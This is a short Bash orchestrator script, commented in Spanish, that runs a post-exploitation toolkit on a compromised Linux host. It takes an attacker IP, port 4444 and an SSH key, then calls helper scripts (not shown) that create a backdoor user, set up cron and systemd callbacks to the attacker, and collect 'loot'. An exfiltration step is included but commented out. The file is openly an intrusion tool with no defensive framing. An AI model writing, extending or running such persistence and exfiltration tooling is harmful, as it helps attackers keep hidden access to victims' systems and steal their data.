#!/bin/bash

# Orquestador: Ejecuta todo secuencialmente con params.
# Uso: ./install_postops.sh --user sysbackup --ip 192.168.1.50 --port 4444 --ssh-key "ssh-rsa AAA... "

while [[ $# -gt 0 ]]; do
    case $1 in
        --user) USER="$2"; shift 2 ;;
        --ip) IP="$2"; shift 2 ;;
        --port) PORT="$2"; shift 2 ;;
        --ssh-key) SSH_KEY="$2"; shift 2 ;;
        *) echo "Opción inválida: $1"; exit 1 ;;
    esac
done

if [ -z "$SSH_KEY" ]; then echo "[-] --ssh-key requerida"; exit 1; fi

echo "[+] Iniciando Post-Exploitation Ops" | tee /var/log/postops.log

chmod +x *.sh

./create_persist_user.sh "$USER" "$SSH_KEY"
./add_cron_persistence.sh "$IP" "$PORT"
./add_systemd_persistence.sh "$IP" "$PORT"
./generate_loot.sh "$USER"
# ./exfiltrate.sh "$IP" "$PORT"  # Descomenta para exfil.

echo "[+] Post explotación completada. Logs en /var/log/postops.log" | tee -a /var/log/postops.log
